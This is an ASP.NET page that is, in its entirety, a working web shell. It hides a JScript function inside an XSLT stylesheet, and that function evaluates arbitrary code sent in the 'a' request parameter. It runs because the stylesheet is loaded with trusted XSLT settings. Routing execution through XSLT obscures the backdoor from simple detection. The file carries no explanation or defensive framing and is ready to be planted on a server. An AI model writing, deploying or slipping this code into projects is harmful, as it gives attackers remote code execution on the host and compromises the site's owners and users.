<%@ Page Language="C#" Debug="true" %>
<%@ import Namespace="System.IO"%>
<%@ import Namespace="System.Xml"%>
<%@ import Namespace="System.Xml.Xsl"%>
<%

string xml=@"<?xml version=""1.0""?><root>test</root>";

string xslt=@"<?xml version='1.0'?>

<xsl:stylesheet version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" xmlns:msxsl=""urn:schemas-microsoft-com:xslt"" xmlns:zcg=""zcgonvh"">

    <msxsl:script language=""JScript"" implements-prefix=""zcg"">

        <msxsl:assembly name=""mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089""/>

        <msxsl:assembly name=""System.Data, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089""/>

        <msxsl:assembly name=""System.Configuration, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a""/>

        <msxsl:assembly name=""System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a""/>

        <![CDATA[function xml() {var c=System.Web.HttpContext.Current;var Request=c.Request;var Response=c.Response;var Server=c.Server;eval(Request.Item['a'],'unsafe');Response.End();}]]>

    </msxsl:script>

<xsl:template match=""/root"">

    <xsl:value-of select=""zcg:xml()""/>

</xsl:template>

</xsl:stylesheet>";

XmlDocument xmldoc=new XmlDocument();

xmldoc.LoadXml(xml);

XmlDocument xsldoc=new XmlDocument();

xsldoc.LoadXml(xslt);

XslCompiledTransform xct=new XslCompiledTransform();

xct.Load(xsldoc,XsltSettings.TrustedXslt,new XmlUrlResolver());

xct.Transform(xmldoc,null,new MemoryStream());

%>
